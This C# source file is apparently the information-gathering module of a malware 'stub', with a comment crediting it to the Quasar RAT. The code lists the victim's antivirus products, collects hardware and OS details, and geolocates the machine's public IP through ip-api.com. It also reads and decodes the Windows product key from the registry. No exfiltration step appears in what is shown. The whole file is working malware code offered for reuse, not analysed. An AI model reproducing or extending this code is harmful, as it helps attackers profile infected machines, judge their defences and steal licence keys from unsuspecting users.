using System;
using System.Collections;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Json;
using System.Text;
using Microsoft.Win32;

namespace VanillaStub.Helpers.Information
{
    internal class ComputerInfo
    {
        //From Quasar Rat
        public static GeoInfo GeoInfo { get; private set; }

        public static string RemoveLastChars(string input, int amount = 2)
        {
            if (input.Length > amount)
                input = input.Remove(input.Length - amount);
            return input;
        }

        public static string GetAntivirus()
        {
            try
            {
                string Name = string.Empty;
                bool WinDefend = false;
                string Path = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                using (ManagementObjectSearcher MOS =
                    new ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct"))
                {
                    foreach (var Instance in MOS.Get())
                    {
                        if (Instance.GetPropertyValue("displayName").ToString() == "Windows Defender")
                            WinDefend = true;
                        if (Instance.GetPropertyValue("displayName").ToString() != "Windows Defender")
                            Name = Instance.GetPropertyValue("displayName").ToString();
                    }

                    if (Name == string.Empty && WinDefend)
                        Name = "Windows Defender";
                    if (Name == "")
                        Name = "N/A";
                    return Name;
                }
            }
            catch
            {
                return "N/A";
            }
        }

        public static string GetName()
        {
            return Environment.MachineName;
        }

        public static string GetGPU()
        {
            try
            {
                string Name = string.Empty;
                using (ManagementObjectSearcher MOS =
                    new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration"))
                {
                    foreach (ManagementObject MO in MOS.Get()) Name += MO["Description"] + " ;";
                }

                Name = RemoveLastChars(Name);
                return !string.IsNullOrEmpty(Name) ? Name : "N/A";
            }
            catch
            {
                return "N/A";
            }
        }

        public static string GetCPU()
        {
            try
            {
                string Name = string.Empty;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
                {
                    foreach (ManagementObject MO in MOS.Get()) Name += MO["Name"] + "; ";
                }

                Name = RemoveLastChars(Name);
                return !string.IsNullOrEmpty(Name) ? Name : "N/A";
            }
            catch { }

            return "N/A";
        }

        public static int GetRamAmount()
        {
            try
            {
                int RamAmount = 0;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem")
                )
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                        RamAmount = (int) (Bytes / 1048576);
                        break;
                    }
                }

                return RamAmount;
            }
            catch
            {
                return -1;
            }
        }

        public static void GetGeoInfo()
        {
            try
            {
                DataContractJsonSerializer JS = new DataContractJsonSerializer(typeof(GeoInfo));
                HttpWebRequest Request = (HttpWebRequest) WebRequest.Create("http://ip-api.com/json/");
                Request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
                Request.Proxy = null;
                Request.Timeout = 10000;
                using (HttpWebResponse Response = (HttpWebResponse) Request.GetResponse())
                {
                    using (Stream DS = Response.GetResponseStream())
                    {
                        using (StreamReader Reader = new StreamReader(DS))
                        {
                            string ResponseString = Reader.ReadToEnd();
                            using (MemoryStream MS = new MemoryStream(Encoding.UTF8.GetBytes(ResponseString)))
                            {
                                GeoInfo = (GeoInfo) JS.ReadObject(MS);
                            }
                        }
                    }
                }
            }
            catch { }

            GeoInfo.Ip = string.IsNullOrEmpty(GeoInfo.Ip) ? "N/A" : GeoInfo.Ip;
            GeoInfo.Country = string.IsNullOrEmpty(GeoInfo.Country) ? "N/A" : GeoInfo.Country;
            GeoInfo.CountryCode = string.IsNullOrEmpty(GeoInfo.CountryCode) ? "-" : GeoInfo.CountryCode;
            GeoInfo.Region = string.IsNullOrEmpty(GeoInfo.Region) ? "N/A" : GeoInfo.Region;
            GeoInfo.City = string.IsNullOrEmpty(GeoInfo.City) ? "N/A" : GeoInfo.City;
            GeoInfo.Timezone = string.IsNullOrEmpty(GeoInfo.Timezone) ? "N/A" : GeoInfo.Timezone;
            GeoInfo.Isp = string.IsNullOrEmpty(GeoInfo.Isp) ? "N/A" : GeoInfo.Isp;
        }

        [DllImport("kernel32.dll")]
        private static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string moduleName);

        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        public static bool Is64BitOperatingSystem()
        {
            // Check if this process is natively an x64 process. If it is, it will only run on x64 environments, thus, the environment must be x64.
            if (IntPtr.Size == 8)
                return true;
            // Check if this process is an x86 process running on an x64 environment.
            IntPtr moduleHandle = GetModuleHandle("kernel32");
            if (moduleHandle != IntPtr.Zero)
            {
                IntPtr processAddress = GetProcAddress(moduleHandle, "IsWow64Process");
                if (processAddress != IntPtr.Zero)
                {
                    bool result;
                    if (IsWow64Process(GetCurrentProcess(), out result) && result)
                        return true;
                }
            }

            // The environment must be an x86 environment.
            return false;
        }

        private static string HKLM_GetString(string key, string value)
        {
            try
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(key);
                return registryKey?.GetValue(value).ToString() ?? string.Empty;
            }
            catch
            {
                return string.Empty;
            }
        }

        public static string GetWindowsVersion()
        {
            string osArchitecture;
            try
            {
                osArchitecture = Is64BitOperatingSystem() ? "64-bit" : "32-bit";
            }
            catch (Exception)
            {
                osArchitecture = "32/64-bit (Undetermined)";
            }

            string productName = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
            string csdVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion");
            string currentBuild = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild");
            if (!string.IsNullOrEmpty(productName))
                return
                    $"{productName}{(!string.IsNullOrEmpty(csdVersion) ? " " + csdVersion : string.Empty)} {osArchitecture} (OS Build {currentBuild})";
            return string.Empty;
        }


        public enum DigitalProductIdVersion
        {
            /// <summary>
            /// All systems up to Windows 7 (Windows 7 and older versions)
            /// </summary>
            UpToWindows7,
            /// <summary>
            /// Windows 8 and up (Windows 8 and newer versions)
            /// </summary>
            Windows8AndUp
        }

        public static string GetWindowsProductKeyFromRegistry()
        {
            var localKey =
                RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem
                    ? RegistryView.Registry64
                    : RegistryView.Registry32);

            var registryKeyValue = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion")?.GetValue("DigitalProductId");
            if (registryKeyValue == null)
                return "Failed to get DigitalProductId from registry";
            var digitalProductId = (byte[])registryKeyValue;
            localKey.Close();
            var isWin8OrUp =
                Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2
                ||
                Environment.OSVersion.Version.Major > 6;
            return GetWindowsProductKeyFromDigitalProductId(digitalProductId,
                isWin8OrUp ? DigitalProductIdVersion.Windows8AndUp : DigitalProductIdVersion.UpToWindows7);
        }

        public static string GetWindowsProductKeyFromDigitalProductId(byte[] digitalProductId, DigitalProductIdVersion digitalProductIdVersion)
        {

            var productKey = digitalProductIdVersion == DigitalProductIdVersion.Windows8AndUp
                ? DecodeProductKeyWin8AndUp(digitalProductId)
                : DecodeProductKey(digitalProductId);
            return productKey;
        }

        private static string DecodeProductKey(byte[] digitalProductId)
        {
            const int keyStartIndex = 52;
            const int keyEndIndex = keyStartIndex + 15;
            var digits = new[]
            {
        'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'R',
        'T', 'V', 'W', 'X', 'Y', '2', '3', '4', '6', '7', '8', '9',
    };
            const int decodeLength = 29;
            const int decodeStringLength = 15;
            var decodedChars = new char[decodeLength];
            var hexPid = new ArrayList();
            for (var i = keyStartIndex; i <= keyEndIndex; i++)
            {
                hexPid.Add(digitalProductId[i]);
            }
            for (var i = decodeLength - 1; i >= 0; i--)
            {
                // Every sixth char is a separator.
                if ((i + 1) % 6 == 0)
                {
                    decodedChars[i] = '-';
                }
                else
                {
                    // Do the actual decoding.
                    var digitMapIndex = 0;
                    for (var j = decodeStringLength - 1; j >= 0; j--)
                    {
                        var byteValue = (digitMapIndex << 8) | (byte)hexPid[j];
                        hexPid[j] = (byte)(byteValue / 24);
                        digitMapIndex = byteValue % 24;
                        decodedChars[i] = digits[digitMapIndex];
                    }
                }
            }
            return new string(decodedChars);
        }

        public static string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
        {
            var key = String.Empty;
            const int keyOffset = 52;
            var isWin8 = (byte)((digitalProductId[66] / 6) & 1);
            digitalProductId[66] = (byte)((digitalProductId[66] & 0xf7) | (isWin8 & 2) * 4);

            const string digits = "BCDFGHJKMPQRTVWXY2346789";
            var last = 0;
            for (var i = 24; i >= 0; i--)
            {
                var current = 0;
                for (var j = 14; j >= 0; j--)
                {
                    current = current * 256;
                    current = digitalProductId[j + keyOffset] + current;
                    digitalProductId[j + keyOffset] = (byte)(current / 24);
                    current = current % 24;
                    last = current;
                }
                key = digits[current] + key;
            }

            var keypart1 = key.Substring(1, last);
            var keypart2 = key.Substring(last + 1, key.Length - (last + 1));
            key = keypart1 + "N" + keypart2;

            for (var i = 5; i < key.Length; i += 6)
            {
                key = key.Insert(i, "-");
            }

            return key;
        }

}
}